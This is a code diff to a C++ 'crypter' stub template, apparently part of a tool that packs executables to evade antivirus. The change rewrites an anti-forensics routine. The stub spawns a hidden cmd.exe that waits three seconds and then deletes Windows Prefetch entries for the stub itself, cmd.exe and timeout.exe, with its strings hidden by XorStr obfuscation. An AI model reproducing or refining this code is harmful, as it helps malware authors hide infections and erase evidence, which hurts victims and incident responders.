@@ -80,14 +80,27 @@ const char* CRYPTER_BASE_SOURCE =
 "GetModuleFileName(NULL, szExeFileName, MAX_PATH);\n"
 "string filepath = string(szExeFileName);\n"
 "string exe = filepath.substr(filepath.find_last_of(XorStr(\"\\\\\")) + 1, filepath.size());\n" 
-"CHAR cat[MAX_PATH] = \"\"; strcat(cat, XorStr(\"cmd.exe /c timeout 3 & del \\\"C:\\\\Windows\\\\Prefetch\\\\\")); \n"
+
+"char prefetch[MAX_PATH];\n"
+"ExpandEnvironmentStringsA(XorStr(\"%%WINDIR%%\\\\Prefetch\\\\\"), prefetch, MAX_PATH);\n"
+
+"char clear_prefetch[0x1000];\n"
+"snprintf(clear_prefetch , 0x1000, XorStr(\"cmd.exe /c timeout 3 & del %%s%%s* & del %%scmd.exe* & del %%stimeout.exe* \") , prefetch, exe.c_str(), prefetch, prefetch);\n"
+"printfdbg(clear_prefetch);\n"
+
+//"CHAR cat[MAX_PATH] = \"\"; strcat(cat, XorStr(\"cmd.exe /c timeout 3 & del \\\"C:\\\\Windows\\\\Prefetch\\\\\")); \n"
 "STARTUPINFOA startInf;\n"
 "memset(&startInf, 0, sizeof startInf);\n"
 "startInf.cb = sizeof(startInf);\n"
 "PROCESS_INFORMATION procInf;\n"
 "memset(&procInf, 0, sizeof procInf);\n"
-"BOOL b = CreateProcessA(NULL, strcat(strcat(cat, exe.c_str()), XorStr(\"*\\\" & del \\\"C:\\\\Windows\\\\Prefetch\\\\cmd.exe*\\\" & del \\\"C:\\\\Windows\\\\Prefetch\\\\timeout.exe*\\\" \")), NULL, NULL, FALSE,\n"
+
+"BOOL b = CreateProcessA(NULL, clear_prefetch, NULL, NULL, FALSE,\n"
 "	NORMAL_PRIORITY_CLASS | CREATE_NO_WINDOW, NULL, NULL, &startInf, &procInf); \n"
+
+//"BOOL b = CreateProcessA(NULL, strcat(strcat(cat, exe.c_str()), XorStr(\"*\\\" & del \\\"C:\\\\Windows\\\\Prefetch\\\\cmd.exe*\\\" & del \\\"C:\\\\Windows\\\\Prefetch\\\\timeout.exe*\\\" \")), NULL, NULL, FALSE,\n"
+//"	NORMAL_PRIORITY_CLASS | CREATE_NO_WINDOW, NULL, NULL, &startInf, &procInf); \n"
+
 "%s\n" //function_trash_0();
 "#ifdef DEBUG\n"
 "system(\"pause\");\n"
